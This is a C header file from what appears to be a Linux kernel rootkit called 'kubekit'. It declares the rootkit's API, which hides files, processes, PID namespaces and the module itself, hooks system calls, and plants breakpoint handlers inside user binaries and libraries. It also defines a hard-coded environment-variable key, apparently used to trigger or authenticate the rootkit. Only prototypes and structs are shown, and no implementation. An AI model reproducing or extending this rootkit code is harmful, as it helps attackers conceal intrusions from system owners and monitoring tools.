#ifndef __KUBEKIT_API_H__
#define __KUBEKIT_API_H__

#include <asm/syscall.h>

#include "helpers.h"
#include "logging.h"

#define KKFL_FILE   (1 << 0)
#define KKFL_PROC   (1 << 1)
#define KKFL_LIB    (1 << 2)

#define FUNC_START  0
#define FUNC_END    -1

#define INST_SIZE   2

#define LOG_DEVICE_NAME     "kubekit"
#define KUBEKIT_ENV_KEY     "KUBEKIT=SOME_SECRET"

void kubekit_del_all(void);
int kubekit_add_bp(
    char *file,
    off_t offset,
    off_t func_off,
    void (*handler)(struct pt_regs *),
    u64 flags
);
struct kubekit_bp *kubekit_lookup_bp(char *file, off_t offset);
int kubekit_do_init(void);
void kubekit_cleanup(void);
int kubekit_start(void);
off_t kubekit_find_offset(char *file, char *func, bool lib);
sys_call_ptr_t hook_get_orig(int sysidx);
int hide_file(const char *file);
void unhide_file(const char *file);
bool file_hidden(const char *file);
bool should_hide_file(const char *file);
void update_hide_pids(void);
int hide_pidns(unsigned int id);
void unhide_pidns(unsigned int id);
void kill_self(void);
void show_self(void);
void hide_self(void);
void hide_proc(int pid);
void unhide_proc(int pid);

struct bp_pos {
    char *file;
    off_t offset;
    u8 prev_bytes[INST_SIZE];

    struct list_head list;
};

struct kubekit_bp {
    struct list_head positions;
    bool is_end;
    void (*handler)(struct pt_regs *);
    u64 flags;
    struct kubekit_bp *next;
    bool written;
    atomic_t waiting;
    bool removed;

    struct list_head list;
    struct semaphore *lock;
};

struct kubekit_hidden_file {
    char *file;

    struct list_head list;
};

#endif
